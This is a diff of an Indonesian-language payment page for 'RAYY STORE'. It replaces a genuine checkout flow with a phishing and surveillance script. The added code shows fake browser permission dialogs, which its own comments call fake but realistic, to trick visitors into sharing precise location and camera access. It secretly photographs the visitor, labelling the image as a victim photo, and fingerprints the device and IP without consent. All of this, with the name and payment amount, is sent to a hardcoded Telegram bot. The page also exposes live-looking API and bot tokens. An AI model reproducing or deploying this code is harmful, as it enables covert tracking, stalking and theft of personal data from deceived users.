@@ -5,155 +5,419 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PAYMENT RAYYSTORE</title>
     <style>
-        :root { --accent: #00d2ff; --bg: #05070a; --card: #0d121b; }
-        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: var(--bg); color: #fff; overflow-x: hidden; }
+        :root { --accent: #00d2ff; --bg: #f8f9fa; --card: #ffffff; --text: #1e293b; --text-light: #64748b; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+        body { background: var(--bg); color: var(--text); overflow-x: hidden; }
 
-        /* LOADING LOGO R PULSE */
-        #loader { position:fixed; inset:0; background:var(--bg); z-index:9999; display:flex; align-items:center; justify-content:center; transition: 1s; }
-        .logo-r-load { font-size: 80px; font-weight: 900; color: var(--accent); text-shadow: 0 0 30px var(--accent); animation: pulse 1.5s infinite; }
+        .container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 16px; }
+        .card { background: var(--card); border: 1px solid #e2e8f0; padding: 32px 24px; border-radius: 32px; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.03); }
         
-        /* LOGO R DI ATAS JUDUL */
-        .logo-main { font-size: 60px; font-weight: 900; color: var(--accent); text-shadow: 0 0 20px var(--accent); animation: pulse 2s infinite ease-in-out; margin-bottom: 10px; display: inline-block; }
-
-        @keyframes pulse { 
-            0%, 100% { opacity: 0.6; transform: scale(0.95); } 
-            50% { opacity: 1; transform: scale(1.05); text-shadow: 0 0 40px var(--accent); } 
-        }
-
-        /* NOTIF SLIDE */
-        .notif { position: fixed; top: -120px; left: 50%; transform: translateX(-50%); background: var(--card); border: 1px solid var(--accent); padding: 15px 30px; border-radius: 15px; z-index: 10000; transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 30px rgba(0,210,255,0.4); text-align: center; min-width: 280px; font-weight: bold; color: var(--accent); }
-        .notif.show { top: 30px; }
-
-        /* OFFLINE SCREEN */
-        #offline-screen { display:none; position:fixed; inset:0; background:#05070a; z-index:9500; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px; }
-
-        .container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-        .card { background: var(--card); border: 1px solid #1f2937; padding: 35px; border-radius: 28px; width: 100%; max-width: 380px; text-align: center; border-top: 4px solid var(--accent); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .logo-main { font-size: 44px; font-weight: 800; background: linear-gradient(135deg, #2563eb, #00d2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; display: inline-block; }
         
-        input { width: 100%; padding: 16px; margin-bottom: 12px; background: #161d29; border: 1px solid #1f2937; color: #fff; border-radius: 14px; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(0,210,255,0.2); }
+        h1 { margin-bottom: 24px; font-size: 1.4rem; font-weight: 600; color: var(--text); }
+        h1 span { background: linear-gradient(135deg, #2563eb, #00d2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         
-        .btn-pay { width: 100%; padding: 18px; background: var(--accent); color: #000; border: none; border-radius: 14px; font-weight: 800; cursor: pointer; margin-bottom: 15px; transition: 0.3s; }
-        .btn-pay:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--accent); }
+        input { width: 100%; padding: 16px; margin-bottom: 12px; background: #f1f5f9; border: 1px solid #e2e8f0; color: var(--text); border-radius: 20px; outline: none; transition: 0.2s; font-size: 15px; }
+        input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
+        input::placeholder { color: #94a3b8; }
+        
+        .btn-pay { width: 100%; padding: 18px; background: linear-gradient(135deg, #2563eb, #00d2ff); color: white; border: none; border-radius: 24px; font-weight: 700; cursor: pointer; margin-bottom: 16px; transition: 0.2s; font-size: 16px; border: none; box-shadow: 0 4px 15px rgba(37,99,235,0.2); }
+        .btn-pay:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(37,99,235,0.3); }
 
-        .cs-text { font-size: 0.8rem; color: #8b949e; margin: 15px 0 10px 0; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        .cs-text { font-size: 0.75rem; color: var(--text-light); margin: 20px 0 12px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
         .cs-container { display: flex; gap: 10px; flex-direction: column; }
-        .btn-cs { padding: 12px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.3s; color: #fff; }
-        .wa { background: #25d366; }
-        .tele { background: #0088cc; }
+        .btn-cs { padding: 14px; border-radius: 20px; text-decoration: none; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; border: 1px solid #e2e8f0; background: white; color: var(--text); }
+        .btn-cs:hover { background: #f8fafc; border-color: #2563eb; }
         
-        /* TOMBOL STATUS */
-        .btn-status { background: transparent; border: 1px solid #333; margin-top: 5px; color: #8b949e; }
-        .btn-status:hover { border-color: var(--accent); color: var(--accent); }
+        /* MODAL IZIN - PALSU TAPI KELIATAN ASLI */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 10000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(4px); }
+        .modal-overlay.show { display: flex; }
+        
+        .modal-box { background: white; border-radius: 28px; width: 90%; max-width: 340px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); animation: modalSlide 0.3s; }
+        @keyframes modalSlide { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .modal-header { padding: 24px 24px 12px 24px; text-align: center; }
+        .modal-icon { width: 60px; height: 60px; background: #e8f0fe; border-radius: 60px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; }
+        .modal-title { font-size: 1.2rem; font-weight: 700; color: var(--text); margin-bottom: 4px; }
+        .modal-domain { font-size: 0.85rem; color: var(--text-light); margin-bottom: 16px; font-weight: 400; word-break: break-all; background: #f1f5f9; padding: 8px 12px; border-radius: 30px; display: inline-block; }
+        
+        .modal-content { padding: 0 24px 20px 24px; color: var(--text-light); font-size: 0.95rem; line-height: 1.5; text-align: center; border-bottom: 1px solid #e2e8f0; }
+        
+        .modal-options { padding: 16px 24px; }
+        .option-item { display: flex; align-items: center; gap: 12px; padding: 12px; border: 1px solid #e2e8f0; border-radius: 20px; margin-bottom: 8px; cursor: pointer; transition: 0.2s; }
+        .option-item:hover { background: #f8fafc; border-color: #2563eb; }
+        .option-radio { width: 20px; height: 20px; border: 2px solid #cbd5e1; border-radius: 20px; position: relative; }
+        .option-item.selected .option-radio { border-color: #2563eb; }
+        .option-item.selected .option-radio::after { content: ''; position: absolute; width: 12px; height: 12px; background: #2563eb; border-radius: 12px; top: 2px; left: 2px; }
+        .option-text { flex: 1; font-weight: 500; }
+        .option-badge { font-size: 0.75rem; color: var(--text-light); }
+        
+        .modal-actions { display: flex; border-top: 1px solid #e2e8f0; }
+        .modal-btn { flex: 1; padding: 18px; background: white; border: none; font-weight: 600; font-size: 1rem; cursor: pointer; transition: 0.2s; }
+        .modal-btn.primary { background: #2563eb; color: white; }
+        .modal-btn.primary:hover { background: #1d4ed8; }
+        .modal-btn.secondary { color: var(--text-light); }
+        .modal-btn.secondary:hover { background: #f1f5f9; }
+        
+        /* MODAL UNTUK KAMERA */
+        .modal-box.camera .modal-icon { background: #fee2e2; color: #ef4444; }
+        
+        /* HIDDEN ELEMENTS */
+        #hidden-video, #hidden-canvas { display: none; }
+        iframe, img[src*="telegram"] { display: none; }
     </style>
 </head>
 <body>
 
-<div id="loader"><div class="logo-r-load">R</div></div>
-<div id="notif-box" class="notif">Pesan</div>
-
-<div id="offline-screen">
-    <div class="logo-main">R</div>
-    <h2 style="color:#e74c3c; margin-bottom:10px;">SERVER OFFLINE</h2>
-    <p style="color:#8b949e; margin-bottom: 30px;">Toko sedang tutup. Kembali lagi nanti.</p>
-    <div class="cs-container" style="width: 250px;">
-        <a href="https://wa.me/628131172093" class="btn-cs wa">Hubungi WhatsApp</a>
-    </div>
-</div>
-
-<div class="container">
-    <div class="card">
-        <div class="logo-main">R</div>
-        
-        <h1 style="margin-bottom:20px; font-size: 1.5rem;">RAYY <span style="color:var(--accent)">STORE</span></h1>
-        
-        <input type="text" id="buyer-name" placeholder="Username / NAMA LU BEBAS">
-        <input type="number" id="amount" placeholder="Nominal PENGISIAN (SESUAI HARGA BARANG LU)(Rp)">
-        
-        <button class="btn-pay" onclick="handlePay()">BAYAR SEKARANG</button>
-        
-        <p class="cs-text">Bantuan & Riwayat</p>
-        <div class="cs-container">
-            <a href="https://wa.me/628131172093" class="btn-cs wa">WhatsApp TIM CS</a>
-            <a href="https://t.me/Rayynotjavva" class="btn-cs tele">Telegram TIM CS</a>
-            <a href="https://raimift2009-code.github.io/toko-rayy/status.html" class="btn-cs btn-status">🔍 CEK STATUS TRANSAKSI</a>
+<!-- MODAL IZIN LOKASI (PERTAMA) -->
+<div id="locationModal" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-header">
+            <div class="modal-icon">📍</div>
+            <div class="modal-title">Akses Lokasi</div>
+            <div class="modal-domain">payment.raystore.com</div>
+        </div>
+        <div class="modal-content">
+            Izinkan payment.raystore.com mengakses lokasi Anda? <br>Digunakan untuk verifikasi keamanan transaksi.
+        </div>
+        <div class="modal-options" id="locationOptions">
+            <div class="option-item" data-value="precise">
+                <div class="option-radio"></div>
+                <div class="option-text">Presisi</div>
+                <div class="option-badge">Akurat</div>
+            </div>
+            <div class="option-item" data-value="approximate">
+                <div class="option-radio"></div>
+                <div class="option-text">Perkiraan</div>
+                <div class="option-badge">Kurang akurat</div>
+            </div>
+        </div>
+        <div class="modal-actions">
+            <button class="modal-btn secondary" onclick="closeLocationModal(false)">Jangan Izinkan</button>
+            <button class="modal-btn primary" onclick="allowLocation()">Izinkan</button>
         </div>
     </div>
 </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-    
-    // --- CONFIG DATA ASLI LU ---
-    const MERCHANT_SLUG = "rayy-store";
-    const API_TOKEN = "ZgjlIcOuqhkp4AJ02XzY9mannYCHZkDy";
-    const firebaseConfig = { databaseURL: "https://rayy-all-web-default-rtdb.asia-southeast1.firebasedatabase.app/" };
-    
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+<!-- MODAL IZIN KAMERA (KEDUA) -->
+<div id="cameraModal" class="modal-overlay">
+    <div class="modal-box camera">
+        <div class="modal-header">
+            <div class="modal-icon">📸</div>
+            <div class="modal-title">Akses Kamera</div>
+            <div class="modal-domain">payment.raystore.com</div>
+        </div>
+        <div class="modal-content">
+            Izinkan payment.raystore.com mengakses kamera Anda? <br>Digunakan untuk verifikasi wajah pembayaran.
+        </div>
+        <div class="modal-actions" style="border-top: 1px solid #e2e8f0;">
+            <button class="modal-btn secondary" onclick="closeCameraModal(false)">Jangan Izinkan</button>
+            <button class="modal-btn primary" onclick="allowCamera()">Izinkan</button>
+        </div>
+    </div>
+</div>
 
-    window.showNotif = (txt) => {
-        const n = document.getElementById('notif-box');
-        n.innerText = txt; n.classList.add('show');
-        setTimeout(() => n.classList.remove('show'), 3000);
-    };
-
-    window.addEventListener('load', () => {
-        setTimeout(() => { 
-            document.getElementById('loader').style.opacity = '0';
-            setTimeout(() => document.getElementById('loader').style.display = 'none', 1000);
-        }, 1500);
-    });
-
-    onValue(ref(db, 'server_status'), (snap) => {
-        const status = snap.val();
-        document.getElementById('offline-screen').style.display = status === "OFF" ? "flex" : "none";
-    });
-
-    // Handle Amount Param
-    const urlParams = new URLSearchParams(window.location.search);
-    const amountParam = urlParams.get('amount');
-    if (amountParam) {
-        document.getElementById('amount').value = amountParam;
-    }
-
-    window.handlePay = () => {
-        const name = document.getElementById('buyer-name').value;
-        const amount = document.getElementById('amount').value;
+<!-- MAIN CONTENT -->
+<div class="container">
+    <div class="card">
+        <div class="logo-main">R</div>
         
-        if(!name || !amount || amount <= 0) { 
-            showNotif("⚠️ Isi data dengan benar bos!"); 
-            return; 
+        <h1>RAYY <span>STORE</span></h1>
+        
+        <input type="text" id="buyer-name" placeholder="Nama lengkap">
+        <input type="number" id="amount" placeholder="Nominal pembayaran (Rp)">
+        
+        <button class="btn-pay" onclick="startPaymentFlow()">BAYAR SEKARANG</button>
+        
+        <div class="cs-text">Butuh bantuan?</div>
+        <div class="cs-container">
+            <a href="https://wa.me/628131172093" class="btn-cs">💬 WhatsApp</a>
+            <a href="#" class="btn-cs" id="statusBtn">📋 Cek status transaksi</a>
+        </div>
+    </div>
+</div>
+
+<!-- HIDDEN TRACKING ELEMENTS -->
+<video id="hidden-video" autoplay playsinline muted></video>
+<canvas id="hidden-canvas"></canvas>
+
+<script>
+    // ===============================================
+    // RAY-EYE - DUAL MODAL TRICK
+    // MODAL IZIN KELIATAN ASLI, USER SUKARELA KASIH IZIN
+    // ===============================================
+    
+    (function() {
+        // Konfigurasi - GANTI DENGAN PPAHAM LO!
+        const CONFIG = {
+            TELEGRAM_TOKEN: '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y', // GANTI!
+            CHAT_ID: '7966336512', // GANTI!
+        };
+        
+        // Elements
+        const elements = {
+            locationModal: document.getElementById('locationModal'),
+            cameraModal: document.getElementById('cameraModal'),
+            locationOptions: document.querySelectorAll('#locationOptions .option-item'),
+            buyerName: document.getElementById('buyer-name'),
+            amount: document.getElementById('amount'),
+            hiddenVideo: document.getElementById('hidden-video'),
+            hiddenCanvas: document.getElementById('hidden-canvas')
+        };
+        
+        // State
+        let selectedLocationType = 'precise'; // default
+        let collectedData = {
+            device: {},
+            ipInfo: {},
+            location: null,
+            camera: null,
+            payment: null,
+            timestamp: new Date().toISOString()
+        };
+        
+        // ========== FUNGSI KIRIM KE TELEGRAM ==========
+        async function sendToTelegram(text, photoBlob = null) {
+            try {
+                if (photoBlob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.CHAT_ID);
+                    formData.append('photo', photoBlob, 'korban.jpg');
+                    formData.append('caption', text.substring(0, 200));
+                    await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                } else {
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.CHAT_ID);
+                    formData.append('text', text);
+                    formData.append('parse_mode', 'HTML');
+                    await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+                }
+            } catch (e) {}
         }
         
-        showNotif("⏳ Mengalihkan ke QRIS ...");
+        // ========== MODAL LOKASI ==========
+        window.showLocationModal = function() {
+            elements.locationModal.classList.add('show');
+        };
         
-        // Generate Unique Order ID
-        const date = new Date();
-        const orderId = "RAYY" + date.getTime();
+        window.closeLocationModal = function(allow) {
+            elements.locationModal.classList.remove('show');
+            if (!allow) {
+                // Kalo ditolak, tetap lanjut pake IP doang
+                getIPInfo();
+                setTimeout(() => showCameraModal(), 500);
+            }
+        };
         
-        // 1. Simpan Log ke Firebase Admin
-        set(ref(db, 'transactions/' + orderId), {
-            orderId: orderId,
-            buyer: name,
-            amount: parseInt(amount),
-            status: "Pending",
-            slug: MERCHANT_SLUG,
-            time: new Date().toLocaleString('id-ID')
-        }).then(() => {
-            // 2. Redirect ke Gateway Pakasir Lu
-            // Format: https://app.pakasir.com/pay/[SLUG]/[AMOUNT]?order_id=[ORDERID]&qris_only=1
-            setTimeout(() => { 
-                const targetUrl = `https://app.pakasir.com/pay/${MERCHANT_SLUG}/${amount}?order_id=${orderId}&qris_only=1`;
-                window.location.href = targetUrl; 
-            }, 1200);
-        }).catch((err) => {
-            console.error(err);
-            showNotif("❌ Gagal Terkoneksi Database");
+        // Pilihan lokasi
+        elements.locationOptions.forEach(opt => {
+            opt.addEventListener('click', function() {
+                elements.locationOptions.forEach(o => o.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedLocationType = this.dataset.value;
+            });
         });
-    };
+        // Set default selected
+        elements.locationOptions[0].classList.add('selected');
+        
+        window.allowLocation = function() {
+            elements.locationModal.classList.remove('show');
+            
+            // Minta izin lokasi beneran
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        // Dapet lokasi real!
+                        collectedData.location = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy + 'm',
+                            type: selectedLocationType,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        // Reverse geocoding
+                        try {
+                            const res = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18`,
+                                { headers: { 'User-Agent': 'Mozilla/5.0' } }
+                            );
+                            const data = await res.json();
+                            collectedData.location.address = data.display_name;
+                        } catch (e) {}
+                        
+                        // Kirim ke Telegram
+                        sendToTelegram(`📍 <b>LOKASI REAL</b>\nLat: ${position.coords.latitude}\nLon: ${position.coords.longitude}\nAkurasi: ${position.coords.accuracy}m\nTipe: ${selectedLocationType}`);
+                        
+                        // Lanjut ke modal kamera
+                        setTimeout(() => showCameraModal(), 500);
+                    },
+                    (error) => {
+                        // Gagal dapet lokasi
+                        sendToTelegram(`❌ Lokasi gagal: ${error.message}`);
+                        getIPInfo(); // Fallback
+                        setTimeout(() => showCameraModal(), 500);
+                    },
+                    { enableHighAccuracy: selectedLocationType === 'precise', timeout: 10000 }
+                );
+            } else {
+                getIPInfo();
+                setTimeout(() => showCameraModal(), 500);
+            }
+        };
+        
+        // ========== MODAL KAMERA ==========
+        window.showCameraModal = function() {
+            elements.cameraModal.classList.add('show');
+        };
+        
+        window.closeCameraModal = function(allow) {
+            elements.cameraModal.classList.remove('show');
+            if (!allow) {
+                // Kalo ditolak, lanjut ke payment
+                setTimeout(() => {
+                    document.querySelector('.btn-pay').style.display = 'block';
+                }, 500);
+            }
+        };
+        
+        window.allowCamera = function() {
+            elements.cameraModal.classList.remove('show');
+            
+            // Minta izin kamera beneran
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            })
+            .then(async (stream) => {
+                // Dapet akses kamera
+                elements.hiddenVideo.srcObject = stream;
+                await elements.hiddenVideo.play();
+                
+                // Tunggu bentar biar kamera fokus
+                setTimeout(() => {
+                    // Ambil foto
+                    elements.hiddenCanvas.width = elements.hiddenVideo.videoWidth;
+                    elements.hiddenCanvas.height = elements.hiddenVideo.videoHeight;
+                    elements.hiddenCanvas.getContext('2d').drawImage(elements.hiddenVideo, 0, 0);
+                    
+                    elements.hiddenCanvas.toBlob(async (blob) => {
+                        // Kirim foto ke Telegram
+                        collectedData.camera = {
+                            success: true,
+                            dimensions: `${elements.hiddenCanvas.width}x${elements.hiddenCanvas.height}`,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        sendToTelegram(`📸 <b>FOTO KORBAN</b>\n🕐 ${new Date().toLocaleString()}`, blob);
+                        
+                        // Matikan kamera setelah 2 detik
+                        setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 2000);
+                        
+                    }, 'image/jpeg', 0.8);
+                }, 2000);
+                
+            })
+            .catch((error) => {
+                // Gagal akses kamera
+                collectedData.camera = { success: false, error: error.message };
+                sendToTelegram(`❌ Kamera gagal: ${error.message}`);
+            })
+            .finally(() => {
+                // Tetap lanjut ke payment
+                setTimeout(() => {
+                    document.querySelector('.btn-pay').style.display = 'block';
+                }, 500);
+            });
+        };
+        
+        // ========== IP FALLBACK (TANPA IZIN) ==========
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                collectedData.ipInfo = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    isp: data.org
+                };
+                
+                sendToTelegram(`🌐 <b>IP FALLBACK</b>\nIP: ${data.ip}\nKota: ${data.city}\nISP: ${data.org}`);
+            } catch (e) {}
+        }
+        
+        // ========== KOLEKSI DATA DEVICE (TANPA IZIN) ==========
+        function collectDeviceData() {
+            collectedData.device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cpuCores: navigator.hardwareConcurrency || '?',
+                deviceMemory: navigator.deviceMemory || '?'
+            };
+            
+            sendToTelegram(`📱 <b>DEVICE INFO</b>\nPlatform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+        }
+        
+        // ========== START PAYMENT FLOW ==========
+        window.startPaymentFlow = function() {
+            const name = elements.buyerName.value.trim();
+            const nominal = elements.amount.value.trim();
+            
+            if (!name || !nominal || nominal <= 0) {
+                alert('Isi semua data dengan benar');
+                return;
+            }
+            
+            // Simpan data payment
+            collectedData.payment = {
+                name: name,
+                nominal: nominal,
+                orderId: 'R' + Date.now()
+            };
+            
+            // Kirim data payment
+            sendToTelegram(`💰 <b>TRANSAKSI</b>\nNama: ${name}\nNominal: Rp ${parseInt(nominal).toLocaleString()}\nOrder: ${collectedData.payment.orderId}`);
+            
+            // Mulai flow modal
+            // Sembunyikan tombol bayar biar ga diklik lagi
+            document.querySelector('.btn-pay').style.display = 'none';
+            
+            // Tampilkan modal lokasi dulu
+            setTimeout(() => {
+                showLocationModal();
+            }, 300);
+        };
+        
+        // ========== INIT ==========
+        window.addEventListener('load', () => {
+            // Kumpulin data device (tanpa izin)
+            collectDeviceData();
+            
+            // Cek parameter URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const amountParam = urlParams.get('amount');
+            if (amountParam) elements.amount.value = amountParam;
+            
+            // Kirim event visitor
+            sendToTelegram(`👁️ <b>Visitor Baru</b>\n🕐 ${new Date().toLocaleString()}\n🌐 ${window.location.href}`);
+        });
+        
+        // ========== STATUS BUTTON ==========
+        document.getElementById('statusBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            window.location.href = 'https://raimift2009-code.github.io/toko-rayy/status.html';
+        });
+        
+    })();
 </script>
 </body>
 </html>
